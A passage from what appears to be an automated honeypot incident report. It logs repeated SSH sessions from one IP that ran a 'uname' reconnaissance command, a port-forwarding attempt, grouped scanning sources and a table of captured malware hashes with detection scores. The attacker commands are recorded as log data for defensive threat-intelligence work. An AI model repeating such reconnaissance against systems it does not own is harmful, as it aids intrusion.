| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:53:37` | `cowrie.session.connect` |
| `2026-07-23 20:53:37` | `cowrie.client.version` |
| `2026-07-23 20:53:37` | `cowrie.client.kex` |
| `2026-07-23 20:53:37` | `cowrie.login.success` |
| `2026-07-23 20:53:38` | `cowrie.session.params` |
| `2026-07-23 20:53:38` | `cowrie.command.input` |
| `2026-07-23 20:53:38` | `cowrie.log.closed` |
| `2026-07-23 20:53:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45eed3970e0e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:53 |
| **Last Seen** | 2026-07-23 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:53:42` | `cowrie.session.connect` |
| `2026-07-23 20:53:42` | `cowrie.client.version` |
| `2026-07-23 20:53:42` | `cowrie.client.kex` |
| `2026-07-23 20:53:42` | `cowrie.login.success` |
| `2026-07-23 20:53:43` | `cowrie.session.params` |
| `2026-07-23 20:53:43` | `cowrie.command.input` |
| `2026-07-23 20:53:43` | `cowrie.log.closed` |
| `2026-07-23 20:53:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3378eb3109fc

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:53 |
| **Last Seen** | 2026-07-23 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:53:47` | `cowrie.session.connect` |
| `2026-07-23 20:53:47` | `cowrie.client.version` |
| `2026-07-23 20:53:47` | `cowrie.client.kex` |
| `2026-07-23 20:53:47` | `cowrie.login.success` |
| `2026-07-23 20:53:48` | `cowrie.session.params` |
| `2026-07-23 20:53:48` | `cowrie.command.input` |
| `2026-07-23 20:53:48` | `cowrie.log.closed` |
| `2026-07-23 20:53:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ee9dd6c8b4a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:53 |
| **Last Seen** | 2026-07-23 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:53:52` | `cowrie.session.connect` |
| `2026-07-23 20:53:52` | `cowrie.client.version` |
| `2026-07-23 20:53:52` | `cowrie.client.kex` |
| `2026-07-23 20:53:52` | `cowrie.login.success` |
| `2026-07-23 20:53:53` | `cowrie.session.params` |
| `2026-07-23 20:53:53` | `cowrie.command.input` |
| `2026-07-23 20:53:53` | `cowrie.log.closed` |
| `2026-07-23 20:53:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b248f5210b00

| Field | Detail |
|---|---|
| **Source IP** | `203.252.10[.]3` |
| **First Seen** | 2026-07-23 20:53 |
| **Last Seen** | 2026-07-23 20:54 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:53:53` | `cowrie.session.connect` |
| `2026-07-23 20:53:54` | `cowrie.client.version` |
| `2026-07-23 20:53:54` | `cowrie.client.kex` |
| `2026-07-23 20:53:55` | `cowrie.login.success` |
| `2026-07-23 20:53:56` | `cowrie.direct-tcpip.request` |
| `2026-07-23 20:54:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.252.10[.]3` to AbuseIPDB if not already reported
- [ ] Block `203.252.10[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b623d8ecdabe

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:53 |
| **Last Seen** | 2026-07-23 20:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:53:57` | `cowrie.session.connect` |
| `2026-07-23 20:53:57` | `cowrie.client.version` |
| `2026-07-23 20:53:57` | `cowrie.client.kex` |
| `2026-07-23 20:53:57` | `cowrie.login.success` |
| `2026-07-23 20:53:58` | `cowrie.session.params` |
| `2026-07-23 20:53:58` | `cowrie.command.input` |
| `2026-07-23 20:53:58` | `cowrie.log.closed` |
| `2026-07-23 20:53:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b10474b0ded9

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:54 |
| **Last Seen** | 2026-07-23 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:54:02` | `cowrie.session.connect` |
| `2026-07-23 20:54:02` | `cowrie.client.version` |
| `2026-07-23 20:54:02` | `cowrie.client.kex` |
| `2026-07-23 20:54:02` | `cowrie.login.success` |
| `2026-07-23 20:54:03` | `cowrie.session.params` |
| `2026-07-23 20:54:03` | `cowrie.command.input` |
| `2026-07-23 20:54:03` | `cowrie.log.closed` |
| `2026-07-23 20:54:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97b87b82aaba

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:54 |
| **Last Seen** | 2026-07-23 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:54:08` | `cowrie.session.connect` |
| `2026-07-23 20:54:08` | `cowrie.client.version` |
| `2026-07-23 20:54:08` | `cowrie.client.kex` |
| `2026-07-23 20:54:08` | `cowrie.login.success` |
| `2026-07-23 20:54:09` | `cowrie.session.params` |
| `2026-07-23 20:54:09` | `cowrie.command.input` |
| `2026-07-23 20:54:09` | `cowrie.log.closed` |
| `2026-07-23 20:54:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23e41eb08ed7

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:54 |
| **Last Seen** | 2026-07-23 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:54:13` | `cowrie.session.connect` |
| `2026-07-23 20:54:13` | `cowrie.client.version` |
| `2026-07-23 20:54:13` | `cowrie.client.kex` |
| `2026-07-23 20:54:14` | `cowrie.login.success` |
| `2026-07-23 20:54:14` | `cowrie.session.params` |
| `2026-07-23 20:54:14` | `cowrie.command.input` |
| `2026-07-23 20:54:14` | `cowrie.log.closed` |
| `2026-07-23 20:54:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-71ac8513e9ef

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:54 |
| **Last Seen** | 2026-07-23 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:54:19` | `cowrie.session.connect` |
| `2026-07-23 20:54:19` | `cowrie.client.version` |
| `2026-07-23 20:54:19` | `cowrie.client.kex` |
| `2026-07-23 20:54:19` | `cowrie.login.success` |
| `2026-07-23 20:54:20` | `cowrie.session.params` |
| `2026-07-23 20:54:20` | `cowrie.command.input` |
| `2026-07-23 20:54:20` | `cowrie.log.closed` |
| `2026-07-23 20:54:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67a345d195fb

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:54 |
| **Last Seen** | 2026-07-23 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:54:25` | `cowrie.session.connect` |
| `2026-07-23 20:54:25` | `cowrie.client.version` |
| `2026-07-23 20:54:25` | `cowrie.client.kex` |
| `2026-07-23 20:54:25` | `cowrie.login.success` |
| `2026-07-23 20:54:26` | `cowrie.session.params` |
| `2026-07-23 20:54:26` | `cowrie.command.input` |
| `2026-07-23 20:54:26` | `cowrie.log.closed` |
| `2026-07-23 20:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-891c5432e00d

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:54 |
| **Last Seen** | 2026-07-23 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:54:31` | `cowrie.session.connect` |
| `2026-07-23 20:54:31` | `cowrie.client.version` |
| `2026-07-23 20:54:31` | `cowrie.client.kex` |
| `2026-07-23 20:54:31` | `cowrie.login.success` |
| `2026-07-23 20:54:32` | `cowrie.session.params` |
| `2026-07-23 20:54:32` | `cowrie.command.input` |
| `2026-07-23 20:54:32` | `cowrie.log.closed` |
| `2026-07-23 20:54:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-46ad8a07be70

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:54 |
| **Last Seen** | 2026-07-23 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:54:36` | `cowrie.session.connect` |
| `2026-07-23 20:54:36` | `cowrie.client.version` |
| `2026-07-23 20:54:36` | `cowrie.client.kex` |
| `2026-07-23 20:54:37` | `cowrie.login.success` |
| `2026-07-23 20:54:38` | `cowrie.session.params` |
| `2026-07-23 20:54:38` | `cowrie.command.input` |
| `2026-07-23 20:54:38` | `cowrie.log.closed` |
| `2026-07-23 20:54:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-83782b0b8f52

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:54 |
| **Last Seen** | 2026-07-23 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:54:42` | `cowrie.session.connect` |
| `2026-07-23 20:54:42` | `cowrie.client.version` |
| `2026-07-23 20:54:42` | `cowrie.client.kex` |
| `2026-07-23 20:54:43` | `cowrie.login.success` |
| `2026-07-23 20:54:43` | `cowrie.session.params` |
| `2026-07-23 20:54:43` | `cowrie.command.input` |
| `2026-07-23 20:54:44` | `cowrie.log.closed` |
| `2026-07-23 20:54:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00ad9ffb5e2a

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:54 |
| **Last Seen** | 2026-07-23 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:54:48` | `cowrie.session.connect` |
| `2026-07-23 20:54:48` | `cowrie.client.version` |
| `2026-07-23 20:54:48` | `cowrie.client.kex` |
| `2026-07-23 20:54:48` | `cowrie.login.success` |
| `2026-07-23 20:54:49` | `cowrie.session.params` |
| `2026-07-23 20:54:49` | `cowrie.command.input` |
| `2026-07-23 20:54:49` | `cowrie.log.closed` |
| `2026-07-23 20:54:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e78ddb2fd85

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:54 |
| **Last Seen** | 2026-07-23 20:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:54:53` | `cowrie.session.connect` |
| `2026-07-23 20:54:53` | `cowrie.client.version` |
| `2026-07-23 20:54:53` | `cowrie.client.kex` |
| `2026-07-23 20:54:54` | `cowrie.login.success` |
| `2026-07-23 20:54:54` | `cowrie.session.params` |
| `2026-07-23 20:54:54` | `cowrie.command.input` |
| `2026-07-23 20:54:55` | `cowrie.log.closed` |
| `2026-07-23 20:54:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd9a36a1c84e

| Field | Detail |
|---|---|
| **Source IP** | `77.239.124[.]246` |
| **First Seen** | 2026-07-23 20:54 |
| **Last Seen** | 2026-07-23 20:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-23 20:54:59` | `cowrie.session.connect` |
| `2026-07-23 20:54:59` | `cowrie.client.version` |
| `2026-07-23 20:54:59` | `cowrie.client.kex` |
| `2026-07-23 20:54:59` | `cowrie.login.success` |
| `2026-07-23 20:55:00` | `cowrie.session.params` |
| `2026-07-23 20:55:00` | `cowrie.command.input` |
| `2026-07-23 20:55:00` | `cowrie.log.closed` |
| `2026-07-23 20:55:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.239.124[.]246` to AbuseIPDB if not already reported
- [ ] Block `77.239.124[.]246` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.238.181[.]94` | **9** | 2026-07-23 19:13 | 2026-07-23 20:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `139.199.80[.]137` | **5** | 2026-07-23 19:16 | 2026-07-23 20:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `165.154.11[.]140` | **4** | 2026-07-23 20:47 | 2026-07-23 20:47 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]125` | **3** | 2026-07-23 20:37 | 2026-07-23 20:37 | 0m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-23 20:09 | 2026-07-23 20:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `221.159.21[.]170` | **2** | 2026-07-23 20:34 | 2026-07-23 20:34 | 2m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]110` | **2** | 2026-07-23 20:54 | 2026-07-23 20:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | **2** | 2026-07-23 20:03 | 2026-07-23 20:21 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]215` | **2** | 2026-07-23 19:42 | 2026-07-23 19:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `121.202.198[.]98` | 1 | 2026-07-23 20:53 | 2026-07-23 20:53 | 9s | 0 | `T1592` | 🟢 LOW |
| `195.184.76[.]159` | 1 | 2026-07-23 19:45 | 2026-07-23 19:45 | 2s | 0 | `T1592` | 🟢 LOW |
| `213.65.190[.]48` | 1 | 2026-07-23 20:13 | 2026-07-23 20:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `213.66.196[.]11` | 1 | 2026-07-23 19:45 | 2026-07-23 19:47 | 120s | 0 | `T1592` | 🟢 LOW |
| `45.79.5[.]11` | 1 | 2026-07-23 20:36 | 2026-07-23 20:36 | 0s | 0 | `T1592` | 🟢 LOW |
| `49.124.142[.]137` | 1 | 2026-07-23 20:26 | 2026-07-23 20:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `50.116.26[.]161` | 1 | 2026-07-23 19:43 | 2026-07-23 19:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `64.89.160[.]135` | 1 | 2026-07-23 19:51 | 2026-07-23 19:51 | 0s | 0 | `T1592` | 🟢 LOW |
| `77.239.124[.]246` | 1 | 2026-07-23 20:46 | 2026-07-23 20:46 | 8s | 0 | `T1592` | 🟢 LOW |
| `83.255.209[.]245` | 1 | 2026-07-23 19:20 | 2026-07-23 19:22 | 120s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]142` | 1 | 2026-07-23 19:45 | 2026-07-23 19:45 | 3s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]214` | 1 | 2026-07-23 19:43 | 2026-07-23 19:43 | 0s | 0 | `T1592` | 🟢 LOW |
| `91.230.168[.]92` | 1 | 2026-07-23 19:43 | 2026-07-23 19:43 | 3s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (49 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `00b374d5249b32ab298f86c2137962e6bf1f71e03c4db8e3ae169b601480d730` | Python Script | `00b374d5249b32ab...` | 66/100 | 🟡 MEDIUM | **16/73** 🔴 |
| `0136e2f3dda2e48ca15b2bab1027095ca15fb573294e3904a53e6913dfc62ab6` | ELF Binary (Linux executable) (MIPS 32-bit) | `0136e2f3dda2e48c...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/74 ✅ |
| `048e374baac36d8cf68dd32e48313ef8eb517d647548b1bf5f26d2d0e2e3cdc7` | ELF Binary (Linux executable) (x86 32-bit) | `048e374baac36d8c...` | 45/100 | 🟡 MEDIUM | **38/74** 🔴 |
| `049a2ed3406e7c70ce358c108d1f57001d6f2f1f924215f06d9e43b6c213f62b` | ELF Binary (Linux executable) (ARM 32-bit) | `049a2ed3406e7c70...` | 42/100 | 🟡 MEDIUM | **32/74** 🔴 |
| `09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` | ELF Binary (Linux executable) (unknown (e_machine=0x5d) 32-bit) | `09591253a95411d6...` | 86/100 | 🔴 HIGH | **41/74** 🔴 |
| `11707e3902992c8e20e19de09cbc78381e43234c4560a706a031fe01ce7e96fb` | ELF Binary (Linux executable) (x86-64 64-bit) | `11707e3902992c8e...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **17/74** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 83/100 | 🔴 HIGH | **34/74** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **24/74** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 39/100 | 🟢 LOW | **23/74** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/74** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
